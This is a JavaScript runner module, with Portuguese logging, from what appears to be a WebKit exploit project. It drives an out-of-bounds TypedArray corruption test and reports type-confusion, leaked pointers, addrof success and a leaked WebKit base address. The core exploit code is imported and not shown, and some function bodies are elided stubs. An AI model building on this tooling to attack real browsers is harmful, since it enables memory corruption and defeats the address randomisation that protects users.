// js/script3/runAllAdvancedTestsS3.mjs (Runner para Corrupção de Propriedade M2)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

function safeToHexRunner(value, length = 8) { /* ... (como na versão anterior) ... */ }

async function runHeisenbugReproStrategy_TypedArrayVictim_R43_CorruptM2() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_CorruptM2";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred && !result.oob_params_of_best_result) { /* ... (tratamento de erro) ... */
        logS3(`  RUNNER R43(CorruptM2): ERRO FATAL: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest FATAL ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43(CorruptM2): Teste principal completado. Analisando resultados...`, "good", FNAME_RUNNER);

        logS3(`  --- MELHOR RESULTADO GERAL ENCONTRADO ---`, "info_emphasis", FNAME_RUNNER);
        /* ... (log de bestParamsMsg e TC como antes) ... */
        let bestParamsMsg = 'N/A';
        if (result.oob_params_of_best_result) {
            bestParamsMsg = `Offset: ${result.oob_params_of_best_result.offset}, Valor Escrito: ${result.oob_params_of_best_result.value}`;
        }
        logS3(`    Melhores Parâmetros OOB: ${bestParamsMsg}`, "info", FNAME_RUNNER);
        const heisenbugInBest = result.heisenbug_on_M2_confirmed_by_tc_probe;
        logS3(`    TC Confirmada no Melhor Resultado: ${heisenbugInBest}`, heisenbugInBest ? "vuln" : "info", FNAME_RUNNER);


        if (result.m2_corruption_details_best) {
            const m2corr = result.m2_corruption_details_best;
            logS3(`    Detalhes da Corrupção de M2 (Melhor Iteração - Val Escrito ${m2corr.oob_value_written}):`, "info_emphasis", FNAME_RUNNER);
            logS3(`      Prop1 Antes/Depois: ${m2corr.prop1_before_oob} / ${m2corr.prop1_after_tc}`, "info", FNAME_RUNNER);
            logS3(`      Prop2 Antes/Depois: ${m2corr.prop2_before_oob} / ${m2corr.prop2_after_tc}`, (m2corr.prop2_before_oob !== m2corr.prop2_after_tc) ? "vuln_potential" : "info", FNAME_RUNNER);
            logS3(`      Prop2 é Ponteiro Válido: ${m2corr.prop2_is_valid_pointer}`, m2corr.prop2_is_valid_pointer ? "success_major" : "info", FNAME_RUNNER);
            if (m2corr.leaked_pointer_from_prop2) {
                logS3(`      Ponteiro Vazado de Prop2: ${m2corr.leaked_pointer_from_prop2}`, "leak", FNAME_RUNNER);
            }
            logS3(`      Notas da Corrupção M2: ${m2corr.notes}`, "info", FNAME_RUNNER);
        }

        /* ... (log de addrof_result, webkit_leak_result como antes) ... */
        if (result.addrof_result) { logS3(`    Resultado Addrof (Global): ${result.addrof_result.msg} (Endereço: ${result.addrof_result.leaked_object_addr || 'N/A'})`, result.addrof_result.success ? "success_major" : "warn", FNAME_RUNNER); }
        if (result.webkit_leak_result) { logS3(`    Resultado WebKitLeak (Global): ${result.webkit_leak_result.msg} (Base: ${result.webkit_leak_result.webkit_base_candidate || 'N/A'})`, result.webkit_leak_result.success ? "success_major" : "info", FNAME_RUNNER); }
        if (result.errorOccurred) { logS3(`    Erro no Melhor Resultado Reportado: ${result.errorOccurred}`, "error", FNAME_RUNNER); }


        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  --- SUMÁRIO DE TODAS AS ITERAÇÕES (${result.iteration_results_summary.length} testadas) ---`, "info_emphasis", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                let logMsg = `    Iter ${index + 1} (Off ${iter_sum.oob_offset} Val ${iter_sum.oob_value}): `;
                let highlights = [];
                if (iter_sum.heisenbug_on_M2_confirmed_by_tc_probe) highlights.push("TC_OK");
                if (iter_sum.m2_corruption_analysis?.prop2_is_valid_pointer) highlights.push("M2PropPtrLeak!");
                else if (iter_sum.m2_corruption_analysis?.prop2_before_oob !== iter_sum.m2_corruption_analysis?.prop2_after_tc) highlights.push("M2PropCorrupt");
                if (iter_sum.addrof_success_this_iter) highlights.push("ADDROF_IterOK");
                
                if (highlights.length > 0) { logMsg += highlights.join(", "); }
                else { logMsg += "Sem Efeitos Notáveis"; }
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
                
                let logLevel = "info";
                if (iter_sum.addrof_success_this_iter || iter_sum.m2_corruption_analysis?.prop2_is_valid_pointer) logLevel = "success_major";
                else if (iter_sum.m2_corruption_analysis?.prop2_before_oob !== iter_sum.m2_corruption_analysis?.prop2_after_tc) logLevel = "vuln_potential";
                else if (iter_sum.heisenbug_on_M2_confirmed_by_tc_probe) logLevel = "vuln";
                logS3(logMsg, logLevel, FNAME_RUNNER);
            });
        }

        document.title = result.final_title_page || `${module_name_for_title} Final: Done`;
    } else { /* ... (tratamento de resultado inválido) ... */ }

    logS3(`  Título da página final (definido pelo teste): ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_CorruptM2`;
    logS3(`==== INICIANDO Script 3 R43_CorruptM2 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43_CorruptM2();
    logS3(`\n==== Script 3 R43_CorruptM2 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    // ... (lógica de título final do orchestrator como antes) ...
}
